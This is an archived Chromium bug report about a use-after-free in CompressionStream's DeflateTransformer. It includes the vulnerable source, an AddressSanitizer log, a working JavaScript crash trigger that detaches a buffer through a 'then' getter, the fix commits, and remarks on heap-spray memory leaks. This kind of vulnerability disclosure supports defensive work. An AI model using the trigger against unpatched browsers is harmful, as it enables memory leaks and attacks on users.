# Security: Use-After-Free in DeflateTransformer

| Field | Value |
|-------|-------|
| **Issue ID** | [40053930](https://issues.chromium.org/issues/40053930) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Blink>Network>StreamsAPI, Internals>Core |
| **Platforms** | Android, Linux, Mac, Windows, ChromeOS |
| **Reporter** | bo...@gmail.com |
| **Assignee** | ri...@chromium.org |
| **Created** | 2020-11-20 |
| **Bounty** | $7,500.00 |

## Description

**VULNERABILITY DETAILS**  

<https://source.chromium.org/chromium/chromium/src/+/master:third_party/blink/renderer/modules/compression/deflate_transformer.cc;l=55>  

ScriptPromise DeflateTransformer::Transform(  

v8::Local[v8::Value](javascript:void(0);) chunk,  

TransformStreamDefaultController\* controller,  

ExceptionState& exception\_state) {  

ArrayBufferOrArrayBufferView buffer\_source;  

V8ArrayBufferOrArrayBufferView::ToImpl(  

script\_state\_->GetIsolate(), chunk, buffer\_source,  

UnionTypeConversionMode::kNotNullable, exception\_state);  

if (exception\_state.HadException()) {  

return ScriptPromise();  

}  

if (buffer\_source.IsArrayBufferView()) {  

const auto\* view = buffer\_source.GetAsArrayBufferView().View();  

const uint8\_t\* start = static\_cast<const uint8\_t\*>(view->BaseAddress()); ------------------ [1]  

size\_t length = view->byteLength();  

if (length > std::numeric\_limits<wtf\_size\_t>::max()) {  

exception\_state.ThrowRangeError(  

"Buffer size exceeds maximum heap object size.");  

return ScriptPromise();  

}  

Deflate(start, static\_cast<wtf\_size\_t>(length), IsFinished(false), ------------------ [2]  

controller, exception\_state);  

return ScriptPromise::CastUndefined(script\_state\_);  

}  

DCHECK(buffer\_source.IsArrayBuffer());  

const auto\* array\_buffer = buffer\_source.GetAsArrayBuffer();  

const uint8\_t\* start = static\_cast<const uint8\_t\*>(array\_buffer->Data());  

size\_t length = array\_buffer->ByteLength();  

if (length > std::numeric\_limits<wtf\_size\_t>::max()) {  

exception\_state.ThrowRangeError(  

"Buffer size exceeds maximum heap object size.");  

return ScriptPromise();  

}  

Deflate(start, static\_cast<wtf\_size\_t>(length), IsFinished(false), controller,  

exception\_state);

return ScriptPromise::CastUndefined(script\_state\_);  

}

<https://source.chromium.org/chromium/chromium/src/+/master:third_party/blink/renderer/modules/compression/deflate_transformer.cc;l=105>  

void DeflateTransformer::Deflate(const uint8\_t\* start,  

wtf\_size\_t length,  

IsFinished finished,  

TransformStreamDefaultController\* controller,  

ExceptionState& exception\_state) {  

stream\_.avail\_in = length;  

// Zlib treats this pointer as const, so this cast is safe.  

stream\_.next\_in = const\_cast<uint8\_t\*>(start);

do {  

stream\_.avail\_out = out\_buffer\_.size();  

stream\_.next\_out = out\_buffer\_.data();  

int err = deflate(&stream\_, finished ? Z\_FINISH : Z\_NO\_FLUSH);  

DCHECK((finished && err == Z\_STREAM\_END) || err == Z\_OK ||  

err == Z\_BUF\_ERROR);

```
wtf_size_t bytes = out_buffer_.size() - stream_.avail_out;  
if (bytes) {   
  controller->enqueue( ------------------ [3]  
      script_state_,  
      ScriptValue::From(script_state_,  
                        DOMUint8Array::Create(out_buffer_.data(), bytes)),  
      exception_state);  
  if (exception_state.HadException()) {  
    return;  
  }  
}  

```

} while (stream\_.avail\_out == 0);  

}

<https://source.chromium.org/chromium/chromium/src/+/master:third_party/blink/renderer/core/streams/readable_stream.cc;l=1820>;  

void ReadableStream::FulfillReadRequest(ScriptState\* script\_state,  

ReadableStream\* stream,  

v8::Local[v8::Value](javascript:void(0);) chunk,  

bool done) {  

// <https://streams.spec.whatwg.org/#readable-stream-fulfill-read-request>  

// 1. Let reader be stream.[[reader]].  

ReadableStreamGenericReader\* reader = stream->reader\_;  

ReadableStreamDefaultReader\* default\_reader =  

static\_cast<ReadableStreamDefaultReader\*>(reader);

// 2. Let readRequest be the first element of reader.[[readRequests]].  

StreamPromiseResolver\* read\_request = default\_reader->read\_requests\_.front();

// 3. Remove readIntoRequest from reader.[[readIntoRequests]], shifting all  

// other elements downward (so that the second becomes the first, and so  

// on).  

default\_reader->read\_requests\_.pop\_front();

// 4. Resolve readIntoRequest.[[promise]] with !  

// ReadableStreamCreateReadResult(chunk, done, reader.[[forAuthorCode]]).  

read\_request->Resolve(script\_state, ReadableStream::CreateReadResult( ------------------ [4]  

script\_state, chunk, done,  

default\_reader->for\_author\_code\_));  

}

|DeflateTransformer::Transform| calls |DeflateTransformer::Deflate| with the ArrayBuffer's backing store pointer. [1][2]  

The loop of |DeflateTransformer::Deflate| is repeated if |stream\_.avail\_out| is not zero. And if |bytes| is not 0,  

|controller->enqueue| function is called. [3]

However, when |controller->enqueue| function is called, the |Promise::Resolver::Resolve| function can be called [4]  

and our javascript can be executed by defining the property accessor of 'then'. So we can free the arraybuffer during the loop  

and this leads to Use-After-Free.

asan log

=================================================================  

==1==ERROR: AddressSanitizer: heap-use-after-free on address 0x7f682f1e7800 at pc 0x56164a5e74e7 bp 0x7ffe5d206f70 sp 0x7ffe5d206738  

READ of size 32768 at 0x7f682f1e7800 thread T0 (chrome)  

==1==WARNING: invalid path to external symbolizer!  

==1==WARNING: Failed to use and restart external symbolizer!  

#0 0x56164a5e74e6 (/home/youngjoo/Desktop/chrome/asanbuild/asan-linux-release-812852/chrome+0x9c034e6)  

#1 0x561654e9faee (/home/youngjoo/Desktop/chrome/asanbuild/asan-linux-release-812852/chrome+0x144bbaee)  

#2 0x56164a9ccca6 (/home/youngjoo/Desktop/chrome/asanbuild/asan-linux-release-812852/chrome+0x9fe8ca6)  

#3 0x561654ea1aed (/home/youngjoo/Desktop/chrome/asanbuild/asan-linux-release-812852/chrome+0x144bdaed)  

#4 0x561654e9b23c (/home/youngjoo/Desktop/chrome/asanbuild/asan-linux-release-812852/chrome+0x144b723c)  

#5 0x56166664decd (/home/youngjoo/Desktop/chrome/asanbuild/asan-linux-release-812852/chrome+0x25c69ecd)  

#6 0x56166664dbc7 (/home/youngjoo/Desktop/chrome/asanbuild/asan-linux-release-812852/chrome+0x25c69bc7)  

#7 0x56166356710b (/home/youngjoo/Desktop/chrome/asanbuild/asan-linux-release-812852/chrome+0x22b8310b)  

#8 0x56166356a460 (/home/youngjoo/Desktop/chrome/asanbuild/asan-linux-release-812852/chrome+0x22b86460)  

#9 0x5616635686dc (/home/youngjoo/Desktop/chrome/asanbuild/asan-linux-release-812852/chrome+0x22b846dc)  

#10 0x561663554c17 (/home/youngjoo/Desktop/chrome/asanbuild/asan-linux-release-812852/chrome+0x22b70c17)  

#11 0x561651594a20 (/home/youngjoo/Desktop/chrome/asanbuild/asan-linux-release-812852/chrome+0x10bb0a20)  

#12 0x561651592575 (/home/youngjoo/Desktop/chrome/asanbuild/asan-linux-release-812852/chrome+0x10bae575)  

#13 0x5616515900de (/home/youngjoo/Desktop/chrome/asanbuild/asan-linux-release-812852/chrome+0x10bac0de)  

#14 0x561653695cf7 (/home/youngjoo/Desktop/chrome/asanbuild/asan-linux-release-812852/chrome+0x12cb1cf7)  

#15 0x5616536e51fa (/home/youngjoo/Desktop/chrome/asanbuild/asan-linux-release-812852/chrome+0x12d011fa)  

#16 0x561653648676 (/home/youngjoo/Desktop/chrome/asanbuild/asan-linux-release-812852/chrome+0x12c64676)  

#17 0x561653625e37 (/home/youngjoo/Desktop/chrome/asanbuild/asan-linux-release-812852/chrome+0x12c41e37)  

#18 0x561651837cd6 (/home/youngjoo/Desktop/chrome/asanbuild/asan-linux-release-812852/chrome+0x10e53cd6)  

#19 0x56165183b738 (/home/youngjoo/Desktop/chrome/asanbuild/asan-linux-release-812852/chrome+0x10e57738)  

#20 0x56165183bb88 (/home/youngjoo/Desktop/chrome/asanbuild/asan-linux-release-812852/chrome+0x10e57b88)  

#21 0x5616518c2352 (/home/youngjoo/Desktop/chrome/asanbuild/asan-linux-release-812852/chrome+0x10ede352)  

#22 0x5616518c1d45 (/home/youngjoo/Desktop/chrome/asanbuild/asan-linux-release-812852/chrome+0x10eddd45)  

#23 0x561653859283 (/home/youngjoo/Desktop/chrome/asanbuild/asan-linux-release-812852/chrome+0x12e75283)  

#24 0x561653864f0c (/home/youngjoo/Desktop/chrome/asanbuild/asan-linux-release-812852/chrome+0x12e80f0c)  

#25 0x5616549f350f (/home/youngjoo/Desktop/chrome/asanbuild/asan-linux-release-812852/chrome+0x1400f50f)  

#26 0x5616549f2dbc (/home/youngjoo/Desktop/chrome/asanbuild/asan-linux-release-812852/chrome+0x1400edbc)  

#27 0x561654a1c702 (/home/youngjoo/Desktop/chrome/asanbuild/asan-linux-release-812852/chrome+0x14038702)  

#28 0x561654a1be5f (/home/youngjoo/Desktop/chrome/asanbuild/asan-linux-release-812852/chrome+0x14037e5f)  

#29 0x561654915260 (/home/youngjoo/Desktop/chrome/asanbuild/asan-linux-release-812852/chrome+0x13f31260)  

#30 0x561654a1d926 (/home/youngjoo/Desktop/chrome/asanbuild/asan-linux-release-812852/chrome+0x14039926)  

#31 0x56165499172a (/home/youngjoo/Desktop/chrome/asanbuild/asan-linux-release-812852/chrome+0x13fad72a)  

#32 0x56166730e678 (/home/youngjoo/Desktop/chrome/asanbuild/asan-linux-release-812852/chrome+0x2692a678)  

#33 0x56165471e71f (/home/youngjoo/Desktop/chrome/asanbuild/asan-linux-release-812852/chrome+0x13d3a71f)  

#34 0x561654721b58 (/home/youngjoo/Desktop/chrome/asanbuild/asan-linux-release-812852/chrome+0x13d3db58)  

#35 0x56165471b601 (/home/youngjoo/Desktop/chrome/asanbuild/asan-linux-release-812852/chrome+0x13d37601)  

#36 0x56165471bc3c (/home/youngjoo/Desktop/chrome/asanbuild/asan-linux-release-812852/chrome+0x13d37c3c)  

#37 0x56164a614285 (/home/youngjoo/Desktop/chrome/asanbuild/asan-linux-release-812852/chrome+0x9c30285)  

#38 0x7f684a606bf6 (/lib/x86\_64-linux-gnu/libc.so.6+0x21bf6)

0x7f682f1e7800 is located 65536 bytes inside of 262144-byte region [0x7f682f1d7800,0x7f682f217800)  

freed by thread T0 (chrome) here:  

#0 0x56164a5e7e82 (/home/youngjoo/Desktop/chrome/asanbuild/asan-linux-release-812852/chrome+0x9c03e82)  

#1 0x561651dbbf79 (/home/youngjoo/Desktop/chrome/asanbuild/asan-linux-release-812852/chrome+0x113d7f79)  

#2 0x561662f20a39 (/home/youngjoo/Desktop/chrome/asanbuild/asan-linux-release-812852/chrome+0x2253ca39)  

#3 0x561662f20199 (/home/youngjoo/Desktop/chrome/asanbuild/asan-linux-release-812852/chrome+0x2253c199)  

#4 0x56165fc23911 (/home/youngjoo/Desktop/chrome/asanbuild/asan-linux-release-812852/chrome+0x1f23f911)  

#5 0x56166137dab9 (/home/youngjoo/Desktop/chrome/asanbuild/asan-linux-release-812852/chrome+0x20999ab9)  

#6 0x561666856832 (/home/youngjoo/Desktop/chrome/asanbuild/asan-linux-release-812852/chrome+0x25e72832)  

#7 0x56166681f855 (/home/youngjoo/Desktop/chrome/asanbuild/asan-linux-release-812852/chrome+0x25e3b855)  

#8 0x561651594a20 (/home/youngjoo/Desktop/chrome/asanbuild/asan-linux-release-812852/chrome+0x10bb0a20)  

#9 0x561651592575 (/home/youngjoo/Desktop/chrome/asanbuild/asan-linux-release-812852/chrome+0x10bae575)  

#10 0x5616515900de (/home/youngjoo/Desktop/chrome/asanbuild/asan-linux-release-812852/chrome+0x10bac0de)  

#11 0x561653695cf7 (/home/youngjoo/Desktop/chrome/asanbuild/asan-linux-release-812852/chrome+0x12cb1cf7)  

#12 0x5616536283b7 (/home/youngjoo/Desktop/chrome/asanbuild/asan-linux-release-812852/chrome+0x12c443b7)  

#13 0x561653625eda (/home/youngjoo/Desktop/chrome/asanbuild/asan-linux-release-812852/chrome+0x12c41eda)  

#14 0x561653625cb7 (/home/youngjoo/Desktop/chrome/asanbuild/asan-linux-release-812852/chrome+0x12c41cb7)  

#15 0x561651837eed (/home/youngjoo/Desktop/chrome/asanbuild/asan-linux-release-812852/chrome+0x10e53eed)  

#16 0x561651836e20 (/home/youngjoo/Desktop/chrome/asanbuild/asan-linux-release-812852/chrome+0x10e52e20)  

#17 0x5616520befe9 (/home/youngjoo/Desktop/chrome/asanbuild/asan-linux-release-812852/chrome+0x116dafe9)  

#18 0x5616520bcd1e (/home/youngjoo/Desktop/chrome/asanbuild/asan-linux-release-812852/chrome+0x116d8d1e)  

#19 0x5616520eaa84 (/home/youngjoo/Desktop/chrome/asanbuild/asan-linux-release-812852/chrome+0x11706a84)  

#20 0x5616514904e7 (/home/youngjoo/Desktop/chrome/asanbuild/asan-linux-release-812852/chrome+0x10aac4e7)  

#21 0x561663555e71 (/home/youngjoo/Desktop/chrome/asanbuild/asan-linux-release-812852/chrome+0x22b71e71)  

#22 0x561663569492 (/home/youngjoo/Desktop/chrome/asanbuild/asan-linux-release-812852/chrome+0x22b85492)  

#23 0x56166664e0c0 (/home/youngjoo/Desktop/chrome/asanbuild/asan-linux-release-812852/chrome+0x25c6a0c0)  

#24 0x56166664dbc7 (/home/youngjoo/Desktop/chrome/asanbuild/asan-linux-release-812852/chrome+0x25c69bc7)  

#25 0x56166356710b (/home/youngjoo/Desktop/chrome/asanbuild/asan-linux-release-812852/chrome+0x22b8310b)  

#26 0x56166356a460 (/home/youngjoo/Desktop/chrome/asanbuild/asan-linux-release-812852/chrome+0x22b86460)  

#27 0x5616635686dc (/home/youngjoo/Desktop/chrome/asanbuild/asan-linux-release-812852/chrome+0x22b846dc)  

#28 0x561663554c17 (/home/youngjoo/Desktop/chrome/asanbuild/asan-linux-release-812852/chrome+0x22b70c17)  

#29 0x561651594a20 (/home/youngjoo/Desktop/chrome/asanbuild/asan-linux-release-812852/chrome+0x10bb0a20)

previously allocated by thread T0 (chrome) here:  

#0 0x56164a5e80ed (/home/youngjoo/Desktop/chrome/asanbuild/asan-linux-release-812852/chrome+0x9c040ed)  

#1 0x561662f20842 (/home/youngjoo/Desktop/chrome/asanbuild/asan-linux-release-812852/chrome+0x2253c842)  

#2 0x561662f1fc1e (/home/youngjoo/Desktop/chrome/asanbuild/asan-linux-release-812852/chrome+0x2253bc1e)  

#3 0x5616612127c8 (/home/youngjoo/Desktop/chrome/asanbuild/asan-linux-release-812852/chrome+0x2082e7c8)  

#4 0x56166120dfa1 (/home/youngjoo/Desktop/chrome/asanbuild/asan-linux-release-812852/chrome+0x20829fa1)  

#5 0x561653989ba3 (/home/youngjoo/Desktop/chrome/asanbuild/asan-linux-release-812852/chrome+0x12fa5ba3)  

#6 0x5616538ab3df (/home/youngjoo/Desktop/chrome/asanbuild/asan-linux-release-812852/chrome+0x12ec73df)  

#7 0x5616562fc1ce (/home/youngjoo/Desktop/chrome/asanbuild/asan-linux-release-812852/chrome+0x159181ce)  

#8 0x5616549e42b5 (/home/youngjoo/Desktop/chrome/asanbuild/asan-linux-release-812852/chrome+0x140002b5)  

#9 0x561654a1c5df (/home/youngjoo/Desktop/chrome/asanbuild/asan-linux-release-812852/chrome+0x140385df)  

#10 0x561654a1be5f (/home/youngjoo/Desktop/chrome/asanbuild/asan-linux-release-812852/chrome+0x14037e5f)  

#11 0x561654915260 (/home/youngjoo/Desktop/chrome/asanbuild/asan-linux-release-812852/chrome+0x13f31260)  

#12 0x561654a1d926 (/home/youngjoo/Desktop/chrome/asanbuild/asan-linux-release-812852/chrome+0x14039926)  

#13 0x56165499172a (/home/youngjoo/Desktop/chrome/asanbuild/asan-linux-release-812852/chrome+0x13fad72a)  

#14 0x56166730e678 (/home/youngjoo/Desktop/chrome/asanbuild/asan-linux-release-812852/chrome+0x2692a678)  

#15 0x56165471e71f (/home/youngjoo/Desktop/chrome/asanbuild/asan-linux-release-812852/chrome+0x13d3a71f)  

#16 0x561654721b58 (/home/youngjoo/Desktop/chrome/asanbuild/asan-linux-release-812852/chrome+0x13d3db58)  

#17 0x56165471b601 (/home/youngjoo/Desktop/chrome/asanbuild/asan-linux-release-812852/chrome+0x13d37601)  

#18 0x56165471bc3c (/home/youngjoo/Desktop/chrome/asanbuild/asan-linux-release-812852/chrome+0x13d37c3c)  

#19 0x56164a614285 (/home/youngjoo/Desktop/chrome/asanbuild/asan-linux-release-812852/chrome+0x9c30285)  

#20 0x7f684a606bf6 (/lib/x86\_64-linux-gnu/libc.so.6+0x21bf6)

SUMMARY: AddressSanitizer: heap-use-after-free (/home/youngjoo/Desktop/chrome/asanbuild/asan-linux-release-812852/chrome+0x9c034e6)  

Shadow bytes around the buggy address:  

0x0fed85e34eb0: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd  

0x0fed85e34ec0: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd  

0x0fed85e34ed0: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd  

0x0fed85e34ee0: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd  

0x0fed85e34ef0: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd  

=>0x0fed85e34f00:[fd]fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd  

0x0fed85e34f10: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd  

0x0fed85e34f20: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd  

0x0fed85e34f30: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd  

0x0fed85e34f40: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd  

0x0fed85e34f50: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd  

Shadow byte legend (one shadow byte represents 8 application bytes):  

Addressable: 00  

Partially addressable: 01 02 03 04 05 06 07  

Heap left redzone: fa  

Freed heap region: fd  

Stack left redzone: f1  

Stack mid redzone: f2  

Stack right redzone: f3  

Stack after return: f5  

Stack use after scope: f8  

Global redzone: f9  

Global init order: f6  

Poisoned by user: f7  

Container overflow: fc  

Array cookie: ac  

Intra object redzone: bb  

ASan internal: fe  

Left alloca redzone: ca  

Right alloca redzone: cb  

Shadow gap: cc

**VERSION**  

Chrome Version: stable  

Operating System: any

I tested the asan-linux-release-812852 chrome.

**REPRODUCTION CASE**  

index.html

```
<script>  
let ab;  
async function main() {  
	await fetch("random").then(x => x.body.getReader().read().then(y=>ab=y.value.buffer));  
	Object.defineProperty(Object.prototype, "then", { get() {  
		var ab2 = new ArrayBuffer(0);  
		try{  
			postMessage("", "youngjoo", [ab]);  
		} catch(e) {  
			console.log("free");  
		}  
	}});  
	var input = new Uint8Array(ab);  
	console.log(ab.length);  
	const cs = new CompressionStream('deflate');  
	const writer = cs.writable.getWriter();  
	writer.write(input);  
	writer.close();  
	const output = [];  
	const reader = cs.readable.getReader();  
	console.log(reader);  
	var { value, done } = await reader.read();  
}  
main();  
</script>  

```

randomfile.py

```
with open('/dev/urandom', 'rb') as f:  
    random = f.read(0x40000)  
with open('./random', 'wb') as f:  
    f.write(random)  

```

**CREDIT INFORMATION**  

Reporter credit: YoungJoo Lee(@ashuu\_lee) of Raon Whitehat

## Timeline

### [Deleted User] (2020-11-20)

[Empty comment from Monorail migration]

### cl...@chromium.org (2020-11-20)

ClusterFuzz is analyzing your testcase. Developers can follow the progress at https://clusterfuzz.com/testcase?key=5643388524494848.

### mb...@chromium.org (2020-11-20)

ricea: Could you please take a look or help find another owner?

[Monorail components: Blink>Network>StreamsAPI]

### [Deleted User] (2020-11-21)

Setting milestone and target because of Security_Impact=Stable and high severity.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### ri...@chromium.org (2020-11-21)

[Empty comment from Monorail migration]

### ri...@chromium.org (2020-11-21)

Interesting. I think we can copy the input data before the enqueue if and only if there are still bytes left to process. This will avoid the overhead of copying in the normal case.

### cl...@chromium.org (2020-11-23)

ClusterFuzz testcase 5643388524494848 appears to be flaky, updating reproducibility label.

### cl...@chromium.org (2020-11-23)

Detailed Report: https://clusterfuzz.com/testcase?key=5643388524494848

Fuzzer: None
Job Type: linux_asan_chrome_mp
Platform Id: linux

Crash Type: CHECK failure
Crash Address: 
Crash State:
  r. Sending zygote magic failed in zygote_linux.cc
  content::Zygote::ProcessRequests
  content::ZygoteMain
  
Sanitizer: address (ASAN)

Crash Revision: https://clusterfuzz.com/revisions?job=linux_asan_chrome_mp&revision=829777

Reproducer Testcase: https://clusterfuzz.com/download?testcase_id=5643388524494848

Additional requirements: Requires HTTP

The reproduce tool requires a ClusterFuzz source checkout. To prepare one, run:

git clone https://github.com/google/clusterfuzz && cd clusterfuzz && git checkout tags/reproduce-tool-stable

To reproduce this issue, run:

./reproduce.sh -t https://clusterfuzz.com/testcase-detail/5643388524494848 -b /path/to/build

Please use the GN arguments provided in this report when building the binary. If you have any feedback on reproducing test cases, let us know at https://forms.gle/Yh3qCYFveHj6E5jz5 so we can improve.


************************* UNREPRODUCIBLE *************************
Note: This crash might not be reproducible with the provided testcase. That said, for the past 14 days, we've been seeing this crash frequently.

It may be possible to reproduce by trying the following options:
- Run testcase multiple times for a longer duration.
- Run fuzzing without testcase argument to hit the same crash signature.

If it still does not reproduce, try a speculative fix based on the crash stacktrace and verify if it works by looking at the crash statistics in the report. We will auto-close the bug if the crash is not seen for 14 days.
******************************************************************

### cl...@chromium.org (2020-11-23)

Automatically applying components based on crash stacktrace and information from OWNERS files.

If this is incorrect, please apply the Test-Predator-Wrong-Components label.

[Monorail components: Internals>Core]

### ri...@chromium.org (2020-11-27)

[Empty comment from Monorail migration]

### ri...@chromium.org (2020-12-03)

[Empty comment from Monorail migration]

### bu...@chops-service-accounts.iam.gserviceaccount.com (2020-12-04)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src.git/+/4794770cf175e3bb9425c64a6d196e07392cd34d

commit 4794770cf175e3bb9425c64a6d196e07392cd34d
Author: Adam Rice <ricea@chromium.org>
Date: Fri Dec 04 10:19:12 2020

Correctly handle detach during (de)compression

Sometimes CompressionStream and DecompressionStream enqueue multiple
output chunks for a single input chunk. When this happens, JavaScript
code can detach the input ArrayBuffer while the stream is processing it.
This will cause an error when zlib tries to read the buffer again
afterwards.

To prevent this, buffer output chunks until the entire input chunk has
been processed, and then enqueue them all at once.

Bug: 1151298
Change-Id: I03fca26fc641d54b09067e3994b76ee8efca6839
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/2567539
Commit-Queue: Adam Rice <ricea@chromium.org>
Reviewed-by: Yutaka Hirano <yhirano@chromium.org>
Cr-Commit-Position: refs/heads/master@{#833659}

[modify] https://crrev.com/4794770cf175e3bb9425c64a6d196e07392cd34d/third_party/blink/renderer/modules/compression/deflate_transformer.cc
[modify] https://crrev.com/4794770cf175e3bb9425c64a6d196e07392cd34d/third_party/blink/renderer/modules/compression/inflate_transformer.cc
[modify] https://crrev.com/4794770cf175e3bb9425c64a6d196e07392cd34d/third_party/blink/renderer/modules/compression/inflate_transformer.h
[add] https://crrev.com/4794770cf175e3bb9425c64a6d196e07392cd34d/third_party/blink/web_tests/external/wpt/compression/compression-with-detach.tentative.any.js
[add] https://crrev.com/4794770cf175e3bb9425c64a6d196e07392cd34d/third_party/blink/web_tests/external/wpt/compression/decompression-with-detach.tentative.any.js
[add] https://crrev.com/4794770cf175e3bb9425c64a6d196e07392cd34d/third_party/blink/web_tests/external/wpt/compression/resources/concatenate-stream.js


### ri...@chromium.org (2020-12-07)

This is a read-only UAF and as such is relatively hard to turn into a privilege escalation. As such I'm not planning to request a merge to beta or stable.

### [Deleted User] (2020-12-07)

[Empty comment from Monorail migration]

### [Deleted User] (2020-12-07)

Requesting merge to stable M87 because latest trunk commit (833659) appears to be after stable branch point (812852).

Requesting merge to beta M88 because latest trunk commit (833659) appears to be after beta branch point (827102).

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### [Deleted User] (2020-12-07)

This bug requires manual review: M88's targeted beta branch promotion date has already passed, so this requires manual review
Before a merge request will be considered, the following information is required to be added to this bug:

1. Does your merge fit within the Merge Decision Guidelines?
- Chrome: https://chromium.googlesource.com/chromium/src.git/+/master/docs/process/merge_request.md#when-to-request-a-merge
- Chrome OS: https://goto.google.com/cros-release-branch-merge-guidelines
2. Links to the CLs you are requesting to merge.
3. Has the change landed and been verified on ToT?
4. Does this change need to be merged into other active release branches (M-1, M+1)?
5. Why are these changes required in this milestone after branch?
6. Is this a new feature?
7. If it is a new feature, is it behind a flag using finch?

Chrome OS Only:
8. Was the change reviewed and approved by the Eng Prod Representative? See Eng Prod ownership by component: http://go/cros-engprodcomponents

Please contact the milestone owner if you have questions.
Owners: govind@(Android), bindusuvarna@(iOS), dgagnon@(ChromeOS), srinivassista @(Desktop)

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sr...@google.com (2020-12-07)

ricea@ pls help answer https://crbug.com/chromium/1151298#c16

### [Deleted User] (2020-12-08)

[Empty comment from Monorail migration]

### sr...@google.com (2020-12-08)

Friendly ping ^

### ri...@chromium.org (2020-12-10)

1. Does your merge fit within the Merge Decision Guidelines?
- Chrome: https://chromium.googlesource.com/chromium/src.git/+/master/docs/process/merge_request.md#when-to-request-a-merge
- Chrome OS: https://goto.google.com/cros-release-branch-merge-guidelines

Full automated unit test coverage: Yes, tested automatically by web platform tests
Deployed in Canary for at least 24 hours: Yes
Safe Merge: Yes. Change is well-contained to the affected part of the code and well-tested.

2. Links to the CLs you are requesting to merge.

https://chromium-review.googlesource.com/c/chromium/src/+/2567539

3. Has the change landed and been verified on ToT?

Yes.

4. Does this change need to be merged into other active release branches (M-1, M+1)?

No (removing request for M-87).

5. Why are these changes required in this milestone after branch?

High severity security fix.

6. Is this a new feature?

No.

7. If it is a new feature, is it behind a flag using finch?

N/A

### sr...@google.com (2020-12-10)

Merge approved for M88 branch:4324 

### bu...@chops-service-accounts.iam.gserviceaccount.com (2020-12-10)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src/+/53330915663c715cafe99bf690ea6264edad7ed2

commit 53330915663c715cafe99bf690ea6264edad7ed2
Author: Adam Rice <ricea@chromium.org>
Date: Thu Dec 10 23:28:47 2020

Correctly handle detach during (de)compression

Sometimes CompressionStream and DecompressionStream enqueue multiple
output chunks for a single input chunk. When this happens, JavaScript
code can detach the input ArrayBuffer while the stream is processing it.
This will cause an error when zlib tries to read the buffer again
afterwards.

To prevent this, buffer output chunks until the entire input chunk has
been processed, and then enqueue them all at once.

(cherry picked from commit 4794770cf175e3bb9425c64a6d196e07392cd34d)

Bug: 1151298
Change-Id: I03fca26fc641d54b09067e3994b76ee8efca6839
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/2567539
Commit-Queue: Adam Rice <ricea@chromium.org>
Reviewed-by: Yutaka Hirano <yhirano@chromium.org>
Cr-Original-Commit-Position: refs/heads/master@{#833659}
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/2584723
Reviewed-by: Adam Rice <ricea@chromium.org>
Cr-Commit-Position: refs/branch-heads/4324@{#802}
Cr-Branched-From: c73b5a651d37a6c4d0b8e3262cc4015a5579c6c8-refs/heads/master@{#827102}

[add] https://crrev.com/53330915663c715cafe99bf690ea6264edad7ed2/third_party/blink/web_tests/external/wpt/compression/decompression-with-detach.tentative.any.js
[modify] https://crrev.com/53330915663c715cafe99bf690ea6264edad7ed2/third_party/blink/renderer/modules/compression/inflate_transformer.h
[modify] https://crrev.com/53330915663c715cafe99bf690ea6264edad7ed2/third_party/blink/renderer/modules/compression/deflate_transformer.cc
[add] https://crrev.com/53330915663c715cafe99bf690ea6264edad7ed2/third_party/blink/web_tests/external/wpt/compression/resources/concatenate-stream.js
[add] https://crrev.com/53330915663c715cafe99bf690ea6264edad7ed2/third_party/blink/web_tests/external/wpt/compression/compression-with-detach.tentative.any.js
[modify] https://crrev.com/53330915663c715cafe99bf690ea6264edad7ed2/third_party/blink/renderer/modules/compression/inflate_transformer.cc


### ad...@google.com (2020-12-14)

ricea@ re https://crbug.com/chromium/1151298#c13 could you expand on why this is hard to exploit? A read UaF can be fully exploitable especially if (for instance) it can involve reading vtable pointers or any other code addresses. If you're absolutely sure that this UaF can only ever read pure data, never even pointers or buffer lengths... I possibly agree and if so we should downgrade this to medium. But otherwise, it remains High, and as such we'd normally aim to merge back to M87. Labelling as such, so I don't overlook it next time I do some M87 merge approvals. The VRP will take a look at this on Wednesday so we'll get more opinions in the mix there too.

### bo...@gmail.com (2020-12-14)

Hello, I am YoungJoo, the bug reporter. I think it can be use to leak the useful memory on 32bit Chrome(Windows, Android)
Because we can use gc to unmap the freed memory region and remap it with Heap Spray.
This blog describes a similar exploit : https://blog.exodusintel.com/2019/03/20/cve-2019-5786-analysis-and-exploitation/


### ri...@chromium.org (2020-12-15)

#23 Sorry, I was mistaken. I will merge to M87 if it is approved.
#24 That's really useful information, thank you!

### ad...@google.com (2020-12-15)

Thanks ricea@! Approving merge to M87, branch 4280.

### ad...@google.com (2020-12-15)

(and thanks boright88!)

### ad...@google.com (2020-12-17)

*** Boilerplate reminders! ***
Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.

Please contact security-vrp@chromium.org with any questions.
******************************

### ad...@google.com (2020-12-17)

Congratulations, the VRP panel has decided to award $7,500 for this bug.

### ad...@google.com (2020-12-17)

[Empty comment from Monorail migration]

### bu...@chops-service-accounts.iam.gserviceaccount.com (2020-12-18)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src/+/895c73c58a7cecc5557cbf0ea49c5782f22dd1fc

